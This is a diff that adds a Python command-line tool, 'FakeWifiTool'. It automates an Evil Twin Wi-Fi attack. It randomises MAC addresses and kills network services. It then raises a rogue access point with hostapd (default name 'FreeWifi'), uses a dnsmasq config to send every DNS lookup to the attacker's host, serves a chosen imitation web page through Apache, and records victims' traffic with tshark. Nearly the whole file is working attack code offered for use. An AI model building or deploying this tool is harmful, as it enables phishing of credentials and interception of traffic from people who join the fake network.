@@ -1,0 +1,417 @@
+#!/usr/bin/python3
+
+#FakeWifiTool
+#uses macchanger
+#10-7-23
+
+import os 
+import shutil
+import click
+import time
+import subprocess as sp
+
+
+#Tool Class
+class tool:
+    # This is the Banner with the current status of the hardware, Card Mode, MacAdress and Card used.
+    def printBanner(self,interface,macCardColor,permanentMacAdress,currentMacAdress,cardMode,monitorModeColor):
+        self.banner1 = f"""    ______ _    _ _____ 
+    |  ___| |  | |_   _|
+    | |_  | |  | | | |  
+    |  _| | |/\| | | |  
+    | |   \  /\  / | |  
+    \_|    \/  \/  \_/ 
+    Using Fake Wifi Tool: V1.1.8
+    by theCodemander
+    
+    
+  \33[37m  Current Wifi Card: {interface}
+  \33[37m  Current Mac: \33[{macCardColor}m {currentMacAdress}
+  \33[37m  Permanent Mac: {permanentMacAdress}
+  
+  \33[37m  Is Card in Monitor Mode: \33[{monitorModeColor}m {cardMode}\33[37m 
+    
+    
+    
+    
+    """
+
+        print(self.banner1)
+    def __init__(self,interface):
+
+        self.interface  = interface
+        self.currentMacAdress = ""
+        self.permanentMacAdress = ""
+
+        self.cardMode = ""
+        self.monitorModeColor = "31"
+        self.macCardColor = "31"
+        self.wlanMode = ""
+        self.output = ""
+
+        #Detect the Macadress from the current Networking Card
+        temp = sp.run(["macchanger","-s", f"{self.interface}"],stdout=sp.PIPE)
+        self.currentMacAdress = str(temp.stdout.decode().split("\n"))
+        self.permanentMacAdress = self.currentMacAdress.split()[0]
+        self.currentMacAdress = self.currentMacAdress.split()[2]
+        self.checkInterfaceMode()
+
+
+        self.printBanner(self.interface,self.macCardColor,self.permanentMacAdress,self.currentMacAdress,self.cardMode,self.monitorModeColor)
+        while True:
+            
+            try:
+                # Detect if the Networking Card is in Monitor mode
+                self.checkInterfaceMode()
+                # Check the Mac Adress
+                self.checkMacAdress()
+                os.system("clear")
+                self.printBanner(self.interface,self.macCardColor,self.permanentMacAdress,self.currentMacAdress,self.cardMode,self.monitorModeColor)                        
+                print(self.output)
+                command  = input(">> ")
+                self.output = ""
+                match (command):
+                    case "exit":
+                        exit()
+                    case "help":
+
+                        self.output = "help, clear, changeMac, revertMac, setMonitor, setManaged, restartNetworking, killNetworking,startEvilTwin"
+                    case "clear":
+                        os.system("clear")
+                    case "changeMac":
+                        self.output = self.changeMacAdress(self.interface)
+                        self.macCardColor = "32"
+                    case "revertMac":
+                        self.output = self.revertMacAdress(self.interface)
+                        self.permanentMacAdress = self.currentMacAdress.split()[0]
+                        self.macCardColor = "31"
+                    case "setMonitor":
+                        self.setMonitorMode(self.interface)
+                    case "setManaged":
+                        self.setManagedMode(self.interface)
+                    case "restartNetworking":
+                        if self.cardMode != "Yes":
+                            self.restartAllNetworking()
+                        else:
+                            self.output = "Please set the Card to Managed Mode before you restart the Network"
+                    case "killNetworking":
+                        self.killAllNetworking()
+                    case "startEvilTwin":
+                        self.startEvilTwin()
+                    case _:
+                        self.output = "\nPlease use a existing Command"
+            except KeyboardInterrupt:
+                print("\nPlease type the 'exit' command to exit the program.")
+
+
+
+     #Detect the Macadress from the current Internet Card
+    def checkMacAdress(self):
+       
+        temp = sp.run(["macchanger","-s", f"{self.interface}"],stdout=sp.PIPE)
+        self.currentMacAdress = str(temp.stdout.decode().split("\n"))
+        self.permanentMacAdress = self.currentMacAdress.split()[6]
+        self.currentMacAdress = self.currentMacAdress.split()[2]
+
+    #Change the Macadres of the current Internet Card
+    def changeMacAdress(self,interface):
+        sp.run(["ifconfig",f"{interface}","down"])
+        s = sp.run(["macchanger","-r", f"{interface}"], shell=False, stdout=sp.PIPE, stderr=sp.STDOUT)
+        sp.run(["ifconfig",f"{interface}","up"])
+        macOutput = s.stdout.decode().split("\n")
+        output = str(macOutput[0])+"\n"+str(macOutput[1])+"\n"+str(macOutput[2])+"\n"
+        return output
+
+    #Revert the Card's original adress
+    def revertMacAdress(self,interface):
+        sp.run(["ifconfig",f"{interface}","down"])
+        s = sp.run(["macchanger", "-p", f"{interface}"], shell=False, stdout=sp.PIPE, stderr=sp.STDOUT)
+        sp.run(["ifconfig",f"{interface}","up"])
+        macOutput = s.stdout.decode().split("\n")
+        output = str(macOutput[0])+"\n"+str(macOutput[1])+"\n"+str(macOutput[2])+"\n"
+        return output
+
+
+    
+    # Set the Card to Monitor Mode
+    def setMonitorMode(self,interface):
+        if self.cardMode == "No":
+            sp.run(["ifconfig",f"{interface}","down"])
+            os.system('iwconfig ' + interface + ' mode monitor')
+            os.system(f"ip link set {interface} name {interface}mon")
+            sp.run(["ifconfig",f"{interface}mon","up"])
+            self.interface = interface+"mon"
+            self.output = "Card changed to Monitor mode sucessfully "
+        else:
+            self.output = "Card is allready in Monitor mode"
+    # Set the Card to Managed Mode
+    def setManagedMode(self,interface):
+        if self.cardMode == "Yes":
+            sp.run(["ifconfig",f"{interface}","down"])
+            os.system('iwconfig ' + interface + ' mode managed')
+            size = len(interface)
+            self.interface = interface[:size-3]
+            os.system(f"ip link set {self.interface}mon name {self.interface}")
+            sp.run(["ifconfig",f"{self.interface}","up"])
+            output = "Card changed to Managed mode sucessfully "
+        else:
+            output = "Card is allready in Managed mode" 
+    # Check the current interfaces mode
+    def checkInterfaceMode(self):
+        temp = sp.run(["iwconfig",self.interface],stdout=sp.PIPE)
+        #temp = temp.stdout.decode().split("\n")
+        if("Managed" in str(temp)):
+            self.cardMode = "No"
+            self.monitorModeColor = "31"
+        if("Monitor" in str(temp)):
+            self.cardMode = "Yes"
+            self.monitorModeColor = "32"
+        if("Master" in str(temp)):
+            self.cardMode = "Yes"
+            self.monitorModeColor = "32"   
+
+
+    # Kills all posible porcesses that may disturb packet sending and reciveing
+    def killAllNetworking(self):
+        s = sp.run(["airmon-ng","check","kill"],stderr=sp.STDOUT)
+        os.system("killall hostapd dnsmasq dhcpd")
+        self.output = "Killed posible conflicting processes"
+    
+    # Restarts Networking
+    def restartAllNetworking(self):
+        os.system("systemctl restart NetworkManager")
+        os.system("systemctl start wpa_supplicant")
+        os.system("systemctl start dhcpd")
+        self.output = "Restarted Networking"
+
+
+
+    # These are the Functions for the EVIL TWIN Attack
+
+
+    '''
+    IMPORTANTE
+    http://stackoverflow.com/questions/869092/ddg#5758551
+    https://httpd.apache.org/docs/2.4/rewrite/intro.html
+    https://wiki.archlinux.org/title/Apache_HTTP_Server
+    
+    '''
+
+
+
+    '''
+    https://man.archlinux.org/man/hostapd.8.en
+
+    This manual page documents briefly the hostapd daemon.
+
+    hostapd is a user space daemon for access point and authentication servers. It implements IEEE 802.11 access point management, 
+    IEEE 802.1X/WPA/WPA2/EAP Authenticators and RADIUS authentication server.
+    The current version supports Linux (Host AP, mac80211-based drivers) and FreeBSD (net80211).
+
+    hostapd is designed to be a "daemon" program that runs in the background and acts as the backend component controlling authentication. 
+    hostapd supports separate frontend programs and an example text-based frontend, hostapd_cli, is included with hostapd.
+
+
+    Daemon:In multitasking computer operating systems, a daemon is a computer program that runs as a background process, 
+           rather than being under the direct control of an interactive user.
+    '''
+
+    def writeHostapdConf(self,card,ssid,channel,hw_mode):
+        f = open("/opt/fwt/main/cache/hostapd.conf", "w")
+        f.write(f'''interface={card}
+ssid={ssid}
+channel={channel}
+hw_mode={hw_mode}
+driver=nl80211''')
+        f.close()
+
+
+    '''
+    https://wiki.archlinux.org/title/Dnsmasq
+    https://linux.die.net/man/8/dnsmasq
+
+    dnsmasq provides a DNS server, a DHCP server with support for DHCPv6 and PXE, and a TFTP server.
+    It is designed to be lightweight and have a small footprint, suitable for resource constrained routers and firewalls.
+    dnsmasq can also be configured to cache DNS queries for improved DNS lookup speeds to previously visited sites. 
+
+    DNS server: The most important function of DNS servers is the translation (resolution) of human-memorable domain names (example.com)
+    into the corresponding numeric Internet Protocol (IP) addresses (159.89.194.43), [1] the second principal name space of the Internet,
+    which is used to identify and locate computer systems and resources on the Internet. 
+    
+    DHCP server:The Dynamic Host Configuration Protocol (DHCP) is a network management protocol used on Internet Protocol (IP) 
+    networks for automatically assigning IP addresses and other communication parameters to devices connected to the network using a 
+    client–server architecture.[1]
+
+    '''
+
+    def writeDnsMasqConf(self,card):
+        f = open("/opt/fwt/main/cache/dnsmasq.conf","w")
+        #dhcp-authoritative
+        f.write(f'''#Set the wireless interface
+interface={card}
+#Set the IP range for the clients
+dhcp-range=192.168.1.2,192.168.1.250,255.255.255.0,10h
+#Set Gateway IP Adress
+dhcp-option=3,192.168.1.1
+#Set the DNS server adress
+dhcp-option=6,192.168.1.1
+#Redirect all requests to 192.168.1.1
+address=/#/192.168.1.1''')
+
+
+    def setTemplate(self,folder):
+        shutil.copytree(folder,"/srv/http/fwtpage.dev")
+    def removeTemplate(self,folder):
+        shutil.rmtree(folder,ignore_errors=True,onerror=None)
+    
+    def startEvilTwin(self):
+        print('''
+___________     .__.__    ___________       .__        
+\_   _____/__  _|__|  |   \__    ___/_  _  _|__| ____  
+ |    __)_\  \/ /  |  |     |    |  \ \/ \/ /  |/    \ 
+ |        |\   /|  |  |__   |    |   \     /|  |   |  |
+/_______  / \_/ |__|____/   |____|    \/\_/ |__|___|  /
+        \/                                          \/
+        \n''')
+        os.system("fuser -k 53/tcp")
+        os.system("fuser -k 80/tcp")
+        os.system("killall hostapd dnsmasq dhcpd")
+
+        #Setting up the configuration Files
+        #if self.cardMode == "Yes":
+        if True == True:
+            try:
+                templates = []  
+                NetworkCard = input("Card the Accesspoint should use(default: eth0) \>>")
+                if NetworkCard == '':
+                    NetworkCard = "eth0"
+                AccesspointName = input("Malicious Accesspoint Name(default:FreeWifi) \>>")
+                if AccesspointName == "":
+                    AccesspointName = "FreeWifi"
+                while True:
+                    try:
+                        APchannel= int(input("Enter the channel the AP should use \>>"))
+                    except ValueError:
+                        print("Please enter a valid channel NUMBER")
+                        continue
+                    else:
+                        break 
+                if APchannel < 15:
+                    APhw_mode="g" #2.5Ghz 
+                else:
+                    APhw_mode="a" #5Ghz
+                
+                os.system("rm /opt/fwt/main/cache/hostapd.conf")
+                self.writeHostapdConf(NetworkCard,AccesspointName,APchannel,APhw_mode)
+                os.system("rm /opt/fwt/main/cache/dnsmasq.conf")
+                self.writeDnsMasqConf(NetworkCard)
+            
+                #Selecting AP Template
+                folder="/opt/fwt/main/templates"
+                for f in os.scandir(folder):
+                    if f.is_dir():
+                        templates.append(str(f).split("'")[1])
+                while True:
+                    selectedTemplate = input(f"""What template do you want to use?: {templates}\>>""")
+                    if selectedTemplate in templates:
+                        try:
+                            self.setTemplate("/opt/fwt/main/templates/"+str(selectedTemplate))
+                        except:
+                            self.removeTemplate("/srv/http/fwtpage.dev/")
+                            self.setTemplate("/opt/fwt/main/templates/"+str(selectedTemplate))
+                        break
+                    else:
+                        print("Please enter a valid Template.")
+                        time.sleep(2)
+                        continue
+                
+
+                os.system("xterm -bg black -fg white -hold -e 'dnsmasq -C /opt/fwt/main/cache/dnsmasq.conf -d'>/dev/null 2>&1 &")
+                os.system("xterm -bg black -fg white -hold -e 'hostapd /opt/fwt/main/cache/hostapd.conf'>/dev/null 2>&1 &")
+                os.system(f"ifconfig {NetworkCard} 192.168.1.1 netmask 255.255.255.0")
+                os.system("systemctl restart httpd")
+                os.system(f"xterm -bg black -fg white -hold -e 'tshark -i {NetworkCard} -w /opt/fwt/main/captures/capture.cap'>/dev/null 2>&1 &")
+                
+                
+
+                print("Starting Malicious AP...")
+                print("Evil Twin Deployed Successfully")
+                time.sleep(1)
+                os.system("clear")
+                while True:
+                    os.system("clear")
+                    print('''
+___________     .__.__    ___________       .__        
+\_   _____/__  _|__|  |   \__    ___/_  _  _|__| ____  
+ |    __)_\  \/ /  |  |     |    |  \ \/ \/ /  |/    \ 
+ |        |\   /|  |  |__   |    |   \     /|  |   |  |
+/_______  / \_/ |__|____/   |____|    \/\_/ |__|___|  /
+        \/                                          \/
+        \n''')
+                    try:
+                        print(f"Selected Template: {selectedTemplate}")
+                        print("Press Ctrl + C to stop the attack")
+                    except KeyboardInterrupt:
+                        os.system("hostapd /opt/wci/cache/hostapd.conf -B")
+                        os.system("killall hostapd dnsmasq dhcpd")
+                        break
+                    time.sleep(1)
+            except KeyboardInterrupt:
+                os.system("systemctl stop httpd")
+                os.system("fuser -k 80/tcp &>/dev/null")
+                os.system("killall hostapd dnsmasq dhcpd")
+        
+        #else:
+        #    self.output = "Please change the Card to Monitor mode"
+        
+
+
+"""APACHE CONFIGURATION FILES
+httpd.conf
+1. Uncomment: Virtual hosts Include conf/extra/httpd-vhosts.conf
+httpd-vhosts.conf
+1.Change DocumentRoot to /srv/http/fwtpage.dev
+2.Change ServerName to 192.168.1.1
+/etc/hosts
+"""
+
+
+
+
+
+#Uses Click package to make the tool a CLI Tool
+@click.command()
+
+@click.option("--interface","-i",type=str,help="Wlan card used with the tool(monitor mode option is required!)")
+
+#Starting Program
+def start(interface):
+    try:
+        #Checks if the user runs the Tool as sudo, else it does not start
+        if not os.environ.get("SUDO_UID"):
+            click.echo("You need to run this command as \33[31mroot\33[37m!")
+            quit()
+        else:
+            interface = tool(interface) 
+    except IndexError:
+        click.echo("ERROR: Check that the selected card exists.")
+start()
+
+
+
+#https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html#rewritebase
+#https://www.digitalocean.com/community/tutorial-collections/how-to-set-up-apache-virtual-hosts
+#https://linuxconfig.org/create-redirect-and-rewrite-rules-into-htaccess-on-apache-webserver
+#https://github.com/theCodemander/FWI_Tool/blob/main/setup.sh
+#https://www.digitalocean.com/community/tutorials/how-to-set-up-apache-virtual-hosts-on-arch-linux
+#https://www.howtogeek.com/devops/how-to-run-a-local-network-dhcp-server-with-dnsmasq/
+#https://www.reddit.com/r/pihole/comments/550i08/dnsmasq_no_address_range_available/
+#https://thekelleys.org.uk/dnsmasq/docs/setup.html
+#https://unix.stackexchange.com/questions/347425/make-dnsmasq-not-altering-resolv-conf
+#https://wiki.archlinux.org/title/Apache_HTTP_Server
+#https://www.linux.org/threads/how-to-unblock-wlan1-softblocked-problem-wpa_supplicant-problem-please-help.31931/
+#https://stackoverflow.com/questions/19150610/apache-showing-default-page-vhost-pages
+#https://stackoverflow.com/questions/10263476/how-to-redirect-directory-to-another-domain-with-apache#10263534
+#https://www.linode.com/docs/guides/redirect-urls-with-the-apache-web-server/
+
+#https://itigic.com/what-is-the-monitor-mode-in-wifi-cards-or-adapters/ 
